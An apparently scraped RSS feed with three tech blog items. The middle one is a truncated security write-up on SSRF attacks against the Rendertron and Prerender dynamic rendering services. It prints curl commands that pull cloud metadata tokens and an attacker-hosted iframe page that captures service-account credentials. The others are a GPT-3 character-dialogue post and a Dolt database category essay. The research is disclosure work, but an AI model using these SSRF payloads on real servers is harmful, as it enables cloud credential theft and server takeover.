            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e4dc27662292d3dc5548941/1604696479692-UEEYHDO59CM5AJ15QZ1W/ke17ZwdGBToddI8pDm48kII-a8d2AJAcajZPY95mRzYUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2djO80xWYnvFFMgHmU-X49BeuYeUGWtxLCBQRc1ncHc2cJvwGh1qtNWvMhYKnvaKhbA/LucyMultiLayerTracking2.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5e4dc27662292d3dc5548941/1604696479692-UEEYHDO59CM5AJ15QZ1W/ke17ZwdGBToddI8pDm48kII-a8d2AJAcajZPY95mRzYUqsxRUqqbr1mOJYKfIPR7LoDQ9mXPOjoJoqy81S2I8N_N4V1vUb5AoIIIbLZhVYy7Mythp_T-mtop-vrsUOmeInPi9iDjx9w8K4ZfjXt2djO80xWYnvFFMgHmU-X49BeuYeUGWtxLCBQRc1ncHc2cJvwGh1qtNWvMhYKnvaKhbA/LucyMultiLayerTracking2.jpg" data-image-dimensions="1500x804" data-image-focal-point="0.5829207700627103,0.36022512802055306" alt="LucyMultiLayerTracking2.jpg" src="https://fable-studio.com/behind-the-scenes/LucyMultiLayerTracking2.jpg"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              

              
                <div><div><blockquote><p>It should anticipate us instead of just reacting to us. In short, whatâ€™s missing is that you should feel â€œseenâ€.</p></blockquote></div></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1605570854118_5864"><div><p>Weâ€™re interested in granting these skills to our own characters, which sit atop amazing artificial intelligence technologies like GPT-3. To demonstrate how far weâ€™ve come toward accomplishing our goal of AI-driven storytelling and emotional intelligence, we created this scene of our character Lucy in conversation with a Guest. GPT-3, OpenAIâ€™s powerful Transformer NLP model thatâ€™s been trained on a large corpus of text, is generating almost all of the things said in this video. Essentially, we give the AI some context, and it attempts to complete the text in an intelligent way. It shows how close we are to having natural conversations with an AI that really sees us as individual emotional beings and not task masters by leveraging humans to help guide and train it.</p><p>In an effort to inspire others and move the field forward, let me share some of how weâ€™re doing this on the technology side. Below is a significant subset of the exact context that we gave GPT-3 in the making of this scene. We simply tell it about how we want the conversation to proceed as well as some details about who Lucy and the Guest are so it can generate new dialogue lines with that context.</p><p>CONTEXTS:</p><ul data-rte-list="default"><li><p>The following is a conversation between Lucy and Guest over text messages.</p></li><li><p>In Lucy's world, which is different from the Guest's, the date is 1988, while for the Guest it is still 2020.</p></li><li><p>The Guest reaches out to Lucy over chat message and Lucy responds in a playful way, asking if the Guest is a foozle and comes in peace.</p></li><li><p>Lucy says she can never sleep when the full moon is out, so she's awake now and passing the time by looking out the window for shooting stars.</p></li><li><p>Lucy continues to get to know the guest, asking them lots of personal questions and being imaginative.</p></li><li><p>Lucy eventually asks if the Guest has ever seen a shooting star and what the Guest wished for.</p></li><li><p>Finally, Lucy sees the shooting star, makes her wish, which she keeps as a secret or it won't come true, and then says goodnight.</p></li></ul><p>&nbsp;&nbsp;LUCY:</p><ul data-rte-list="default"><li><p>Little Girl.</p></li><li><p>Active Imagination.</p></li><li><p>Age 8.</p></li><li><p>Lives with Brother, Mom, and Dad.</p></li><li><p>Likes Mysteries, Science, and Drawing.</p></li><li><p>Is looking for a shooting star.</p></li><li><p>Is superstitious and likes horoscopes.</p></li><li><p>Is a daydreamer.</p></li></ul><p>GUEST:</p><ul data-rte-list="default"><li><p>A curious and friendly person who was just introduced to Lucy.</p></li></ul></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1605574654634_5617"><div>








  

    

      <figure data-scrolled="" data-test="image-block-v2-outer-wrapper">

        <div>
          
            <div data-animation-role="image" data-description="">
            
            <p><img data-src="https://images.squarespace-cdn.com/content/v1/5e4dc27662292d3dc5548941/1605811014581-J2UDSS21SBNPHU7ZUEJH/ke17ZwdGBToddI8pDm48kNvT88LknE-K9M4pGNO0Iqd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USOFn4xF8vTWDNAUBm5ducQhX-V3oVjSmr829Rco4W2Uo49ZdOtO_QXox0_W7i2zEA/Subscribe-Video-Chat.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5e4dc27662292d3dc5548941/1605811014581-J2UDSS21SBNPHU7ZUEJH/ke17ZwdGBToddI8pDm48kNvT88LknE-K9M4pGNO0Iqd7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z5QPOohDIaIeljMHgDF5CVlOqpeNLcJ80NK65_fV7S1USOFn4xF8vTWDNAUBm5ducQhX-V3oVjSmr829Rco4W2Uo49ZdOtO_QXox0_W7i2zEA/Subscribe-Video-Chat.jpg" data-image-dimensions="1920x1080" data-image-focal-point="0.5,0.5" alt="Subscribe-Video-Chat.jpg" src="https://fable-studio.com/behind-the-scenes/Subscribe-Video-Chat.jpg"></p>
          
            </div>
          

        </div>

        
          
          <figcaption data-width-ratio="">
            <div>

              

              
                <div><p>Lucy is an imaginative 8 year old who likes Mysteries, Science, and Drawing.</p></div>
              

              

            </div>
          </figcaption>
        

      </figure>

    

  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1605574654634_5907"><div><p>Once we provide the context, we also give it a line or two of dialogue to start the conversation. In the video above, we wrote the Guest saying, â€œHi Lucyâ€ and Lucyâ€™s response, â€œOh, a message. You must be a foozle!â€ The rest of the lines are then generated by GPT-3 -- with one exception: We wrote â€œI canâ€™t sleep when there is a full moon, so Iâ€™m downstairs practicing for computer class tomorrow,â€ but all other lines were generated by GPT-3 based simply on the context and lines provided using a tool we will talk about in a follow up post.</p><p>Once the dialogue is selected, itâ€™s sent through a TTS [Text-To-Speech] processor similar to the ones generating your turn-by-turn directions but much more advanced. Weâ€™ve trained a custom model on many samples of Lucyâ€™s voice so that we can generate ad hoc lines for her, almost instantaneously. That audio is then fed into another model which converts her speech into lip sync and appropriate face animation. We added some tweaks to her head and eye movement, but most of this performance was completely automated without the need for custom animation.</p><p><br>This video is a demonstration of the powerful narratives that can emerge when you combine an artistâ€™s vision, Artificial Intelligence, and emotional intelligence. Some of you may have more questions so feel free to reach out to us or <a href="https://fable-studio.com/signup"><span>sign up to experience a conversation with Lucy yourself</span></a>. While the GPT3 version of Lucy is not available to the public just yet, her current version is also very capable and available now for all those who sign up.</p></div></div></div></div></div></div>

        

        
        
          
        
      </div>

      
    </div>
  
</article>

</div>
    </div>
  </div>
</section>

  
</article>

          
          
          
        
      </div></div>]]>
            </description>
            <link>https://fable-studio.com/behind-the-scenes/ai-generation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25153289</guid>
            <pubDate>Thu, 19 Nov 2020 19:21:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Exploiting dynamic rendering engines to take control of web apps]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25153225">thread link</a>) | @pabloest
<br/>
November 19, 2020 | https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/ | <a href="https://web.archive.org/web/*/https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><div><div><div><p>tl;dr:</p>
<ul>
<li>Dynamic rendering is a technique used to serve prerendered web site pages to crawlers (e.g., Google search engine, Slack or Twitter bots, etc.)</li>
<li>The most popular open source applications for dynamic rendering are Rendertron and Prerender; both of which may introduce vulnerabilities to a network if used improperly.</li>
<li>I used a vulnerability in Rendertron to take over a production web application and earn $5,000 through a bug bounty program.</li>
</ul>
<h2>Introduction</h2>
<p>Modern JavaScript frameworks are heavily utilized for web site development nowadays.
Instead of plain HTML pages, we now have PWAs (progressive web applications) and SPAs (single page applications) that do most of the work in the client's browser and use JavaScript to generate the contents of the page on the fly.</p>
<p>This technology has many advantages and can be effective at creating a sleek UI and UX, but at the same time, it is not <a href="https://en.wikipedia.org/wiki/Search_engine_optimization" target="_blank" rel="noopener">SEO</a> friendly, because crawlers and bots are not developed to render or understand JavaScript. One of the common ways to help bots get valid HTML content is to open a requested page in a headless browser instance on the server, such as <a href="https://pptr.dev/" target="_blank" rel="noopener">Puppeteer</a> or <a href="https://github.com/microsoft/playwright" target="_blank" rel="noopener">Playwright</a>, get the resulting HTML, strip parts that are not intended to be crawled and return it. This approach is called dynamic rendering and is promoted by <a href="https://developers.google.com/search/docs/guides/dynamic-rendering" target="_blank" rel="noopener">Google</a> as one of the possible ways to serve content.</p>

<p>I came across this type of application while doing a security review of packages in the Node.js ecosystem on possible vulnerabilities that may appear when utilizing headless browsers in production. I wrote Semgrep rules and ran them at scale to detect possible vulnerable uses of headless browsers. </p>
<blockquote>
<p>The rules are available in a Semgrep pack here: <a href="https://semgrep.dev/p/headless-browser" target="_blank" rel="noopener">https://semgrep.dev/p/headless-browser</a></p>
</blockquote>
<p>These Semgrep rules produced many results to triage and after investigating them I found out that a significant number of modules that use headless browsers are intended to help webmasters with dynamic rendering.</p>
<p>Due to the growing popularity of this concept, I believe it is important to investigate and understand what can go wrong while using dynamic rendering in production.</p>
<p>The scope of this research includes the two most popular open-source dynamic rendering applications, <a href="https://github.com/GoogleChrome/rendertron" target="_blank" rel="noopener">Rendertron</a> and <a href="https://github.com/prerender/prerender" target="_blank" rel="noopener">Prerender</a>, but the described attacks may be applied to other applications of this type as well. I'll also share how I was able to apply this knowledge to take over a production web server with a few curl requests and earn a $5,000 bug bounty.</p>
<h2>Architecture</h2>
<p>If a web page is generated dynamically on the client but needs to be properly indexed by search engines, a common approach is to catch a request from the crawler or bot, render it server-side, and output the pretty HTML with all the content. That flow generally looks like this:</p>
<p><span>
      <a href="https://r2c.dev/static/2961b2490dc7a3326f9434f550015ebf/077b7/dynamic-rendering-arch.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="dynamic rendering architecture" title="dynamic rendering architecture" src="https://r2c.dev/static/2961b2490dc7a3326f9434f550015ebf/077b7/dynamic-rendering-arch.png" srcset="https://r2c.dev/static/2961b2490dc7a3326f9434f550015ebf/5a46d/dynamic-rendering-arch.png 300w,
https://r2c.dev/static/2961b2490dc7a3326f9434f550015ebf/0a47e/dynamic-rendering-arch.png 600w,
https://r2c.dev/static/2961b2490dc7a3326f9434f550015ebf/077b7/dynamic-rendering-arch.png 1166w" sizes="(max-width: 1166px) 100vw, 1166px" loading="lazy">
  </a>
    </span></p>
<ol>
<li>The web server detects crawlers by checking the User-Agent header (or URL query in some cases).</li>
<li>Requests are routed to the rendering application.</li>
<li>The rendering application runs a headless browser and opens the original requested URL, which will render the page as if viewed by a user with a browser.</li>
<li>The resulting HTML is stripped of <code>&lt;script&gt;</code> tags and returned to the web server.</li>
<li>The web server returns the dynamically rendered page to the crawler.</li>
</ol>
<h2>How to identify a dynamic rendering application</h2>
<p>First of all, dynamic rendering is intended to be used with web pages that need to be indexed properly, so they are publicly available by definition. On top of that, prerendering makes sense only if most of the content on the page is generated by JavaScript (usually with a JS framework like React, Angular, Vue, etc.) and created dynamically at the same time. Some examples include: the main page of a news website that updates in real-time or an online store page with a list of the most popular products.</p>
<p>When a candidate site is found, you can identify if dynamic rendering is possible by sending multiple requests to the same page but with different User-Agent headers (remember, dynamic rendering tries to render pages for crawlers):</p>
<div data-language="bash"><pre><code>
<span>curl</span> -v -A <span>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36"</span> https://shop.polymer-project.org/</code></pre></div>
<div data-language="bash"><pre><code>
<span>curl</span> -v -A <span>"Slackbot-LinkExpanding 1.0 (+https://api.slack.com/robots)"</span> https://shop.polymer-project.org/</code></pre></div>
<p>If the curl results are different and the response for the fake crawler request has pretty HTML without any <code>&lt;script&gt;</code> tags, it means that the website is using dynamic rendering.</p>
<p>You can test this with <a href="https://shop.polymer-project.org/" target="_blank" rel="noopener">https://shop.polymer-project.org/</a> as an example â€” it is a demo site for demonstrating dynamic rendering.</p>
<p><span>
      <a href="https://r2c.dev/static/37e85859c307b4cdec09b478c3ed9636/d5682/dynamic-rendering-curl.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="compare two requests with curl" title="compare two requests with curl" src="https://r2c.dev/static/37e85859c307b4cdec09b478c3ed9636/c1b63/dynamic-rendering-curl.png" srcset="https://r2c.dev/static/37e85859c307b4cdec09b478c3ed9636/5a46d/dynamic-rendering-curl.png 300w,
https://r2c.dev/static/37e85859c307b4cdec09b478c3ed9636/0a47e/dynamic-rendering-curl.png 600w,
https://r2c.dev/static/37e85859c307b4cdec09b478c3ed9636/c1b63/dynamic-rendering-curl.png 1200w,
https://r2c.dev/static/37e85859c307b4cdec09b478c3ed9636/d61c2/dynamic-rendering-curl.png 1800w,
https://r2c.dev/static/37e85859c307b4cdec09b478c3ed9636/d5682/dynamic-rendering-curl.png 2379w" sizes="(max-width: 1200px) 100vw, 1200px" loading="lazy">
  </a>
    </span></p>
<p>If you want to see how each app responds to various User-Agent headers, you can check out the code itself:</p>
<p><a href="https://github.com/prerender/prerender-node/blob/f9c5e12b0e271ded3e3cb6c70b703485280ec9d6/index.js#L37" target="_blank" rel="noopener">https://github.com/prerender/prerender-node/blob/f9c5e12b0e271ded3e3cb6c70b703485280ec9d6/index.js#L37</a></p>
<p><a href="https://github.com/GoogleChrome/rendertron/blob/a1dd3ab1f054bc19e89dcdecdb71dc004f7d068e/middleware/src/middleware.ts#L24" target="_blank" rel="noopener">https://github.com/GoogleChrome/rendertron/blob/a1dd3ab1f054bc19e89dcdecdb71dc004f7d068e/middleware/src/middleware.ts#L24</a></p>
<p>In addition, Rendertron will return the following header: <code>X-Renderer: Rendertron</code>. Prerender has an option for adding an <code>X-Prerender: 1</code> header, but it is not default behavior.</p>
<p>Lastly, both Rendertron and Prerenderer parse specific meta tags in order to change response headers or HTTP status codes. In other words, it gives developers the opportunity to manipulate rendering results by leaving meta tags in the source code of the page. These can also be used to identify a dynamic rendering application.</p>
<p>For Prerender they look like this:</p>
<div data-language="php"><pre><code><span>&lt;</span>meta name<span>=</span><span>"prerender-status-code"</span> content<span>=</span><span>"302"</span> <span>/</span><span>&gt;</span>
<span>&lt;</span>meta name<span>=</span><span>"prerender-header"</span> content<span>=</span><span>"Location: https://www.google.com"</span> <span>/</span><span>&gt;</span></code></pre></div>
<p>For Rendertron:</p>
<div data-language="php"><pre><code><span>&lt;</span>meta name<span>=</span><span>"render:status_code"</span> content<span>=</span><span>"404"</span> <span>/</span><span>&gt;</span></code></pre></div>
<h2>Easy SSRF</h2>
<p>Itâ€™s easy to take advantage of a dynamic rendering app when it is publicly available because it allows you to interact with the app directly and send arbitrary requests, including to local endpoints. There are some restrictions for accessing local infrastructure, but depending on the version of the dynamic rendering app, they can be bypassed.</p>
<h3>Rendertron</h3>
<p>Rendertron is quite easy to identify because it has a web frontend that allows you to send requests and take screenshots of the requested page.</p>
<p><span>
      <a href="https://r2c.dev/static/eaae36db20f54f61637810aeea43748d/4971b/dynamic-rendering-rendertron.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Rendertron" title="Rendertron" src="https://r2c.dev/static/eaae36db20f54f61637810aeea43748d/4971b/dynamic-rendering-rendertron.png" srcset="https://r2c.dev/static/eaae36db20f54f61637810aeea43748d/5a46d/dynamic-rendering-rendertron.png 300w,
https://r2c.dev/static/eaae36db20f54f61637810aeea43748d/0a47e/dynamic-rendering-rendertron.png 600w,
https://r2c.dev/static/eaae36db20f54f61637810aeea43748d/4971b/dynamic-rendering-rendertron.png 784w" sizes="(max-width: 784px) 100vw, 784px" loading="lazy">
  </a>
    </span></p>
<ul>
<li>Version 3.1.0 has allow-listing option to restrict rendering to a given list of domains or URL patterns (but it needs to be configured:))</li>
<li>Version 3.0.0 blocks any requests to Google Cloudâ€”however, this can bypassed by requesting metadata endpoints inside an iFrame. This restriction does not apply to other cloud providers (AWS, DigitalOcean, etc.) and are still a danger!</li>
<li>Older versions block requests to Google Cloud but allow requests to its beta version <code>http://metadata.google.internal/computeMetadata/v1beta1/</code> (deprecated since September 30)</li>
<li>Version 1.1.1 and older allow all kinds of requests</li>
</ul>
<p>Rendertronâ€™s API (from the docs):</p>
<p><strong>GET /render/:url</strong><br>
The render endpoint will render and serialize your page.</p>
<p><strong>GET /screenshot/:url</strong><br>
<strong>POST /screenshot/:url</strong><br>
The screenshot endpoint takes a screenshot of your page (as an image).</p>
<p>Additional options are available as a JSON string in the POST body. See <a href="https://github.com/GoogleChrome/puppeteer/blob/v1.6.0/docs/api.md#pagescreenshotoptions" target="_blank" rel="noopener">Puppeteer documentation</a> for available options. You cannot specify the type (defaults to jpeg) and encoding (defaults to binary) parameters.</p>
<p>So, when you stumble upon a Rendertron instance, it is worth trying to perform a SSRF attack and exfiltrate cloud tokens like this:</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render/http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token</code></pre></div>
<p>or,</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render/http://169.254.169.254/latest/meta-data/</code></pre></div>
<p>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery" target="_blank" rel="noopener">This is a great resource</a> for SSRF payloads.)</p>
<p>If requests are blocked, there is still a chance to force the headless browser to fetch an iFrame and output a screenshot of the metadata endpoint by sending requests to /screenshot and forcing the server to visit a website you control:</p>
<!-- markdown-link-check-disable -->
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render/http://www.attackers-website.here/iframe-example</code></pre></div>
<!-- markdown-link-check-enable -->
<p>The HTML at www.attackers-website.here includes an iFrame with the metadata endpoint. This forces Rendertron to fetch the attacker HTML and render the page on its own server. This means that the iFrame will also be resolved on its own server.</p>
<div data-language="php"><pre><code><span>&lt;</span>html<span>&gt;</span>
  <span>&lt;</span>head<span>&gt;</span>
    <span>&lt;</span>meta content<span>=</span><span>"text/html; charset=utf-8"</span> http<span>-</span>equiv<span>=</span><span>"Content-Type"</span> <span>/</span><span>&gt;</span>
  <span>&lt;</span><span>/</span>head<span>&gt;</span>
  <span>&lt;</span>body<span>&gt;</span>
    <span>&lt;</span>iframe
      src<span>=</span><span>"http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json"</span>
      width<span>=</span><span>"468"</span>
      height<span>=</span><span>"600"</span>
    <span>&gt;</span><span>&lt;</span><span>/</span>iframe<span>&gt;</span>
  <span>&lt;</span><span>/</span>body<span>&gt;</span>
<span>&lt;</span><span>/</span>html<span>&gt;</span></code></pre></div>
<p>This outputs a screenshot of the iFrame containing the cloud instance metadata.
<span>
      <a href="https://r2c.dev/static/0e9c2b61133020bcb36284326fe1ff4d/a4d88/dynamic-rendering-iframe.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Rendertron iFrame hack" title="Rendertron iFrame hack" src="https://r2c.dev/static/0e9c2b61133020bcb36284326fe1ff4d/a4d88/dynamic-rendering-iframe.png" srcset="https://r2c.dev/static/0e9c2b61133020bcb36284326fe1ff4d/5a46d/dynamic-rendering-iframe.png 300w,
https://r2c.dev/static/0e9c2b61133020bcb36284326fe1ff4d/a4d88/dynamic-rendering-iframe.png 495w" sizes="(max-width: 495px) 100vw, 495px" loading="lazy">
  </a>
    </span></p>
<blockquote>
<p>Patched in <a href="https://github.com/GoogleChrome/rendertron/releases/tag/3.1.0" target="_blank" rel="noopener">3.1.0</a> version</p>
</blockquote>
<h3>Prerender</h3>
<p>Prerender does not have a GUI frontend and is not as easy to identify. Worse, requests to / return 400 without any interesting headers:</p>
<div data-language="http"><pre><code><span>HTTP/1.1 <span>400 Bad Request</span></span>
 text/html;charset=UTF-8
 Accept-Encoding
 Mon, 03 Aug 2020 06:55:29 GMT</code></pre></div>
<p>Prerender API</p>
<p><strong>GET /:url</strong><br>
<strong>GET /render?url=:url</strong><br>
<strong>POST /render?url=:url</strong></p>
<p>list of options can be found in the <a href="https://github.com/prerender/prerender#url" target="_blank" rel="noopener">docs</a>, main takeaways:</p>
<ul>
<li>Prerender is also able to a create screenshots</li>
<li><code>followRedirects</code> (false by default) follow 301 redirects if true</li>
</ul>
<p>The only way to identify if an application is using Prerender is to send a request like <code>/render?url=http://www.example.com</code> and check the output. Prerender does not have any built-in protection from cloud data exfiltration but does allow users to configure blacklists and whitelists, so depending on its configuration, chances are that it may be possible to request cloud tokens like</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render?url<span>=</span>http://169.254.169.254/latest/meta-data/</code></pre></div>
<p>On top of that, Prerender connects to headless Chrome through the debug interface, which opens on the hardcoded port 9222.</p>
<p>So if local requests are allowed, itâ€™s possible to figure out the Chrome debug ID</p>
<div data-language="bash"><pre><code><span>curl</span> https://rendertron-instance.here/render?url<span>=</span>http://localhost:9222/json/</code></pre></div>
<p>And then send WebSocket requests to the headless Chrome directly and â€¦</p></div></div></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/">https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/</a></em></p>]]>
            </description>
            <link>https://r2c.dev/blog/2020/exploiting-dynamic-rendering-engines-to-take-control-of-web-apps/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25153225</guid>
            <pubDate>Thu, 19 Nov 2020 19:17:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Product category: version controlled databases]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25152907">thread link</a>) | @oscar-batori
<br/>
November 19, 2020 | https://www.dolthub.com/blog/2020-11-17-version-control-databases-defining-a-category/ | <a href="https://web.archive.org/web/*/https://www.dolthub.com/blog/2020-11-17-version-control-databases-defining-a-category/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-cy="blog-post-text"><p>"Database version control" and "version controlled database" are not the same thing. Version controlling your database refers to the practice of storing schema and schema modifications in a traditional source control system like Git. "Version controlled database" represents a class of append-only databases that offer traditional version control features like branch, diff, and merge across both schema and data. A Google search for <a href="https://www.google.com/search?ei=bXm0X5DDBtWd-gT_krCwCA&amp;q=version+controlled+database&amp;oq=version+controlled+database&amp;gs_lcp=CgZwc3ktYWIQAzICCAAyBAgAEB4yBggAEAoQHjoECAAQRzoECAAQDToICAAQBxAKEB46BggAEAcQHjoGCAAQDRAeULbMAVjO0AFgl9IBaABwA3gAgAGcAYgBzQKSAQMyLjGYAQCgAQGqAQdnd3Mtd2l6yAEIwAEB&amp;sclient=psy-ab&amp;ved=0ahUKEwjQrcSO-YrtAhXVjp4KHX8JDIYQ4dUDCA0&amp;uact=5">"version controlled database"</a> doesn't contain a single database product, but instead products and best practices for managing the schema of existing database solutions:
<span>
      <span></span>
  <img alt="Search Results for &quot;version controlled databases&quot;" title="Search Results for &quot;version controlled databases&quot;" src="https://www.dolthub.com/blog/static/e817fbd3f0a6fdd8b293d2b2017c5cc9/ad12c/version_controlled_database_google_search.png" srcset="https://www.dolthub.com/blog/static/e817fbd3f0a6fdd8b293d2b2017c5cc9/a48b3/version_controlled_database_google_search.png 214w,
https://www.dolthub.com/blog/static/e817fbd3f0a6fdd8b293d2b2017c5cc9/47730/version_controlled_database_google_search.png 428w,
https://www.dolthub.com/blog/static/e817fbd3f0a6fdd8b293d2b2017c5cc9/ad12c/version_controlled_database_google_search.png 856w,
https://www.dolthub.com/blog/static/e817fbd3f0a6fdd8b293d2b2017c5cc9/7a18f/version_controlled_database_google_search.png 1284w,
https://www.dolthub.com/blog/static/e817fbd3f0a6fdd8b293d2b2017c5cc9/56caf/version_controlled_database_google_search.png 1712w,
https://www.dolthub.com/blog/static/e817fbd3f0a6fdd8b293d2b2017c5cc9/76435/version_controlled_database_google_search.png 1742w" sizes="(max-width: 856px) 100vw, 856px" loading="lazy">
    </span></p>
<p>Using version control to manage your database schema is a very good thing, but it is not a "version controlled database." The goal of this post is to reclaim the term "version control database" for products that actually are databases with version control features. We are not unbiased here. We built <a href="https://doltdb.com/">Dolt</a>, a SQL database with Git-style version control features. We think it will be the category defining product, and we want people to be able to find it.</p>
<h2>Version Controlled Database vs Database Version Control</h2>
<p>To make our case for reclaiming this term, it's worth being precise about the distinction we are trying to draw:
<span>
      <a href="https://www.dolthub.com/blog/static/42f24c60af9f9ce77788bfd9687bb02f/6acbf/version_controlled_database_concept.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="Distinct Concepts" title="Distinct Concepts" src="https://www.dolthub.com/blog/static/42f24c60af9f9ce77788bfd9687bb02f/ad12c/version_controlled_database_concept.png" srcset="https://www.dolthub.com/blog/static/42f24c60af9f9ce77788bfd9687bb02f/a48b3/version_controlled_database_concept.png 214w,
https://www.dolthub.com/blog/static/42f24c60af9f9ce77788bfd9687bb02f/47730/version_controlled_database_concept.png 428w,
https://www.dolthub.com/blog/static/42f24c60af9f9ce77788bfd9687bb02f/ad12c/version_controlled_database_concept.png 856w,
https://www.dolthub.com/blog/static/42f24c60af9f9ce77788bfd9687bb02f/6acbf/version_controlled_database_concept.png 1001w" sizes="(max-width: 856px) 100vw, 856px" loading="lazy">
  </a>
    </span></p>
<p>The diagram highlights the nature of the difference between a set of best practices and tools, and a database product:</p>
<ul>
<li>"Database version control" involves using a version control system (VCS) such as Git to version the schema and schema modifications of your database. The database itself knows nothing of its version history. There are many advanced tools and products for this.</li>
<li>A "version controlled database" is a database that stores a full history of its own state, both data and schema.</li>
</ul>
<p>This distinction brings us to the features that define "version controlled databases" as a category: the ability to store a history of its state, along with some version of branching, merging, and diffing across the stored history.</p>
<h2>Why now?</h2>
<p>In a blog entitled <a href="https://medium.com/@karpathy/software-2-0-a64152b37c35">Software 2.0</a>, Andrej Karpathy, a machine learning and artificial intelligence researcher and practitioner, describes a world where computer behavior is increasingly determined by data rather than code. You don't have to be an AI or ML cheerleader to recognize the increasing importance of data in determining the behavior of production systems. Ultimately, the value of data is increasing. Separately, storage costs of data have been in long run secular decline. These two factors combined with the advent of <a href="https://en.wikipedia.org/wiki/Merkle_tree">Merkle tree</a> make it tractable to expose a full data history to a query interface, and therefore to build true version controlled databases.</p>
<h2>Why adopt</h2>
<p>We identified the fundamental features of a version controlled database as both the ability to store a history of the database state, as well as version control primitives such as branching, merging, and diffing.</p>
<h3>Branching and Merging</h3>
<p>Branching and merging are fundamental primitives for collaboration. They allow users to work concurrently against the same base dataset, and then resolve their differences in a principled and robust way. These capabilities differentiate version control databases from existing solutions by enabling users to collaborate on datasets without application layer code. The existing paradigm for databases imagines a single concept of state, and any tools that permit versioning and reconciliation need to be built into the application layer.</p>
<h3>Diffing</h3>
<p>Robust computation of "diffs" is not just useful for review, it is what enables version control systems to effectively implement operations like <code>clone</code> and <code>pull</code>. By implementing efficient diffs across their history, version control databases make for excellent data distribution formats. Users can <code>clone</code> and <code>pull</code> datasets, instantly querying strongly typed data using the database's query interface. The concept of "loading" data becomes redundant, and a whole class of errors defined by data type corruption is eliminated. It shouldn't be necessary to figure out what strings a data vendor uses to signify <code>NULL</code>, it should be native to the distribution format.</p>
<p>These features combine to provide much needed capabilities to data science and data engineering teams, and whoever else might have use for them. In particular</p>
<ul>
<li>collaboration becomes a first class consideration, with the ability for potentially hundreds of users to edit a dataset concurrently and robustly combine the results</li>
<li>experiments and their results become completely reproducible by associating runs with a commit hash of the input data and result set</li>
<li>distribution is transformed from a headache of parsing and loading various data formats which do not provide type guarantees to simply executing <code>clone</code> and <code>pull</code> operations</li>
</ul>
<p>In summary, we believe that version control databases can enable teams with powerful capabilities that they would otherwise have to invest considerable engineering resources in building and maintaining on top of existing database solutions.</p>
<h2>Examples of Version Controlled Databases</h2>
<p>If you've gotten to this point, it's likely that you are at least curious about what the landscape of products in this category of databases looks like. Naturally there are options other than Dolt, and for some use-cases those options might be the best fit.</p>
<h3>TerminusDB</h3>
<p><a href="https://github.com/terminusdb">TerminusDB</a> is a graph database, which means that data is described and queried in terms of graph data structures. It implements its own query language. TerminusDB is inspired by Git, and supports branching, merging and diffing in a Git-like interface.</p>
<h3>Noms</h3>
<p>Dolt is built on top of <a href="https://github.com/attic-labs/noms">Noms</a>. Noms is a Git-like distributed database that provides storage for structured objects defined by Go structs. Noms provides versioning and synchronization primitives for both the object definitions themselves, and values those objects take on. Users interact with Noms via Go code.</p>
<h3>Irmin</h3>
<p><a href="https://github.com/mirage/irmin">Irmin</a> is a storage layer agnostic database inspired by Git, and written in O'Caml. Users define objects in O'Caml that can then be stored using Git-like semantics. It is quite similar in spirit to Noms, but instead of Go structs, users describe, create, and update their data in O'Caml code.</p>
<h3>Dolt</h3>
<p><a href="https://github.com/dolthub/dolt">Dolt</a> is our entry into this novel category of database. Dolt is a SQL database that implements the MySQL standard. Dolt leans heavily on Git, and implements branching, merging, and diff operations, and other Git primitives where relevant.</p>
<h2>Why Dolt</h2>
<p>The choice to implement the MySQL standard as a query interface strongly differentiates Dolt. Other version controlled databases, while interesting, require users to adopt a query interface that suits the database. Dolt takes the opposite position. We believe that SQL is the language of choice for the vast majority of our potential users, and we made the decision to adopt a query interface that suits our users.</p>
